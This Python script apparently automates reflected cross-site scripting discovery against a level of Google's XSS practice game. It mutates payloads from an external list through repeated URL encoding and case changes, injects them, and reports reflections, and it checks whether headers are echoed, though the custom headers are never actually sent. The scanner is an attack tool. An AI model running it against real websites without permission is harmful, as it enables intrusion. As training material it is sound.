import re
import itertools
from bs4 import BeautifulSoup
import requests
import urllib.parse
import random
import xpath_soup
from lxml import etree
import lxml.html
from sys import stdout

url = "https://xss-game.appspot.com/level5/frame/signup?next="

username = ""
password = ""

results = set()

def findInputInCode():
	input = "wherecanyoufindthisstring"
	sample = requests.get(url + input, auth=(username, password))
	search_in = ["img", "a", "script", "div", "span"]
	xpathes = []

	soup = BeautifulSoup(sample.text, "lxml")
	elems = soup.find_all(string=re.compile(input))
	for elem in elems:
		xpathes.append(xpath_soup.xpath_soup(elem))

	found_in = soup.find_all("")
	for search in search_in:
		found_in += soup.find_all(search)

	for elem in found_in:
		if input in str(elem):
			xpathes.append(xpath_soup.xpath_soup(elem))
	return {x for x in xpathes}

def inject(injection, xpathes, original):
	r = requests.get(url + injection, auth=(username, password), stream=True)
	if r.status_code is 200:
		verify = verifyResultsStupid(r, xpathes, original)
		if verify != "ok":
			if verify == "plain input worked":
				results.add("injection of: " + injection)
				stdout.write("+")
			else:
				results.add(verify)
				stdout.write("~")
		else:
			stdout.write("-")
		stdout.flush()

def scan():
	print("Scanning: " + url)
	xpathes = findInputInCode();
	print("=" * 60)
	print("XPathes to the injected code are:")
	for xpath in xpathes:
		print("\t" + xpath)

	print("=" * 60)
	check_headers()

	file = open("xss.txt","r")
	print("=" * 60)
	print("Testing predefined patterns: xss.txt + mutations")
	for injection in file:
		if injection != "":
			injection_transformations = generate_transformations(injection[:-1])
			for xss in injection_transformations:
				inject(xss, xpathes, injection_transformations[0])
	print("")

	print("=" * 60)
	print("Have a closer look at:")
	for result in results:
		print("\t" + result)

def verifyResultsStupid(r, xpath, xss):
	if xss.lower() in r.text.lower():
		return "plain input worked"

	if "&#" in r.text.lower():
			return "unicode hex might work (found &#...)"

	return "ok"

def charToHex(c):
	return "\\x" + format(ord(c), "x")

def charToUnicodeHex(c):
	return "&#" + format(ord(c), "x") + ";"

def encode_hex(injection):
	result = ""
	for c in injection:
		result += charToHex(c)
	return result

def encode_unicode_hex(injection):
	result = ""
	for c in injection:
		result += charToUnicodeHex(c)
	return result

def randomUpperLower(c):
	if random.randint(0,2) == 1:
		return c.lower()
	else:
		return c.upper()

def randomizeUpperLower(injection):
	result = ""
	for c in injection:
		result += randomUpperLower(c)
	return result

def allUpper(injection):
	return injection.upper()

def encode_url(input):
	return urllib.parse.quote(input, safe='')

def generate_transformations(injection):
	injection_transformations = [injection,
                encode_url(injection),
                encode_url(encode_url(injection)),
		encode_url(encode_url(encode_url(injection))),
		randomizeUpperLower(injection),
		allUpper(injection)]
	return injection_transformations

def check_headers():
	useragentheader = 'thisismysupersecretuseragent'
	fromheader = "thisismysupersecretfromheader"
	headers = {
    	'User-Agent': useragentheader,
    	'From': fromheader
		}
	r = requests.get(url + "abc", auth=(username, password))
	if useragentheader.lower() in r.text.lower():
		print("User-Agent found in html")
	else:
		print("User-Agent not found in html")
	if fromheader.lower() in r.text.lower():
		print("From-Header found in html")
	else:
		print("From-Header mot found in html")

scan()
